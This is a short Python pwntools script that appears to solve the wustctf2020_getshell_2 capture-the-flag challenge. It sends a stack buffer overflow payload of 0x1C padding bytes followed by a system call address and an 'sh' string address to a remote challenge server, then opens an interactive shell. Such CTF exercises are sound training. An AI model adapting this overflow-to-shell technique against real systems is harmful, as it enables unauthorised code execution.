from pwn import *

context.arch = 'i386'

p = remote('node4.buuoj.cn', 29258)
elf = ELF('./wustctf2020_getshell_2')
sh_address = 0x8048670
system_call = 0x8048529
p.recvuntil('_\\')
p.recvline()
p.recvline()
p.sendline(b'a' * 0x1C + flat([system_call, sh_address]))
p.interactive()
